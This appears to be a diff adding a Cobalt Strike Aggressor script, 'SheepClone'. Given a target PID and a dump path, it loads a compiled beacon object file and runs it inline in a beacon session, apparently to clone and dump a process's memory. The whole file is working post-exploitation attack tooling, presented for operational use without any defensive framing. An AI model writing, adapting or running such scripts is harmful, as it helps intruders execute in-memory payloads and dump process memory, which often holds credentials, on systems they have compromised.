@@ -1,0 +1,42 @@
+# SheepClone BOF Aggressor Script
+
+alias sheepclone {
+	local('$barch $handle $data $args $pid $dump_path');
+
+	# Check if correct number of arguments is provided
+	if (size(@_) < 3) {
+		bprint($1, "Usage: sheepclone <PID> <DUMP_PATH>");
+		return;
+	}
+
+	# Extract arguments
+	$pid = int(@_[1]); # PID as an integer
+	$dump_path = @_[2]; # Dump file path as a string
+
+	# Validate PID
+	if ($pid <= 0) {
+		bprint($1, "Error: PID must be a positive number!");
+		return;
+	}
+
+	# Figure out the architecture of this session
+	$barch = barch($1);
+
+	# Read in the BOF file based on architecture
+	$handle = openf(script_resource("sheepclone.x64.o"));
+	if ($handle eq $null) {
+		bprint($1, "Error: Failed to open BOF file 'sheepclone.x64.o'");
+		return;
+	}
+	$data = readb($handle, -1);
+	closef($handle);
+
+	# Pack arguments for BOF: PID (int) and dump path (string)
+	$args = bof_pack($1, "is", $pid, $dump_path);
+
+	# Announce that we are running the BOF
+	btask($1, "Running SheepClone BOF with PID $pid and dump path $dump_path");
+
+	# Execute the BOF
+	beacon_inline_execute($1, $data, "go", $args);
+}
